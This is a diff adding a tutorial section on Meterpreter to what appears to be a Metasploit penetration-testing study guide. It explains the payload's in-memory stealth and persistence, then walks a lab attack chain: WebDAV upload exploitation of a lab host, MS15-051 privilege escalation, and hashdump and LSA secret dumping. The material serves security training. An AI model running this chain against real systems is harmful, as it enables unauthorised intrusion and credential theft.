@@ -798,3 +798,69 @@ OPTIONS:
 ---
 
 With sessions and jobs, Metasploit provides efficient management tools for running and switching between multiple tasks and exploits during an assessment. This flexibility is invaluable for larger-scale penetration tests or complex engagements.
+
+
+
+# Meterpreter in Metasploit
+
+## Overview
+The Meterpreter Payload is a specific type of multi-faceted, extensible Payload that uses DLL injection to ensure the connection to the victim host is stable and difficult to detect using simple checks and can be configured to be persistent across reboots or system changes. Furthermore, Meterpreter resides entirely in the memory of the remote host and leaves no traces on the hard drive, making it difficult to detect with conventional forensic techniques.
+
+It is dubbed the swiss army knife of pentesting, and for a good reason. The purpose of Meterpreter is to specifically improve our post-exploitation procedures, offering us a hand-picked set of relevant tools for more straightforward enumeration of the target host from the inside. It can help us find various privilege escalation techniques, AV evasion techniques, further vulnerability research, provide persistent access, pivot, etc.
+
+## Key Features
+- **Stealthy**: Meterpreter resides entirely in memory and writes nothing to the disk. No new processes are created, as Meterpreter injects itself into a compromised process. Additionally, communications are encrypted using AES.
+- **Powerful**: Uses a channelized communication system and allows spawning of host-OS shells inside the Meterpreter stage.
+- **Extensible**: Features can be augmented at runtime and loaded over the network, allowing for constant updates and customizations.
+
+## Using Meterpreter
+To run Meterpreter, you need to select an appropriate payload and exploit, ensuring compatibility with the target system. Once executed, Meterpreter provides a shell with extended functionalities.
+
+### Example of Running Meterpreter
+```bash
+msf6 > db_nmap -sV -p- -T5 -A 10.10.10.15
+msf6 > use exploit/windows/iis/iis_webdav_upload_asp
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set RHOST 10.10.10.15
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > set LHOST tun0
+msf6 exploit(windows/iis/iis_webdav_upload_asp) > run
+```
+
+### Interacting with Meterpreter
+Once a Meterpreter session is active:
+```bash
+meterpreter > help
+meterpreter > getuid
+meterpreter > ps
+```
+
+### Example of Privilege Escalation
+Use the `local_exploit_suggester` module to find vulnerabilities:
+```bash
+msf6 > use post/multi/recon/local_exploit_suggester
+msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
+msf6 post(multi/recon/local_exploit_suggester) > run
+```
+
+If a suitable exploit is found:
+```bash
+msf6 > use exploit/windows/local/ms15_051_client_copy_image
+msf6 exploit(windows/local/ms15_051_client_copy_image) > set SESSION 1
+msf6 exploit(windows/local/ms15_051_client_copy_image) > run
+```
+
+## Post-Exploitation
+Meterpreter provides various post-exploitation commands:
+- **Hash Dumping**:
+```bash
+meterpreter > hashdump
+```
+- **Dumping LSA Secrets**:
+```bash
+meterpreter > lsa_dump_secrets
+```
+
+These commands allow you to retrieve sensitive data, impersonate users, or pivot further into the network.
+
+---
+
+Meterpreter's versatility and power make it an essential tool in any penetration tester's arsenal.
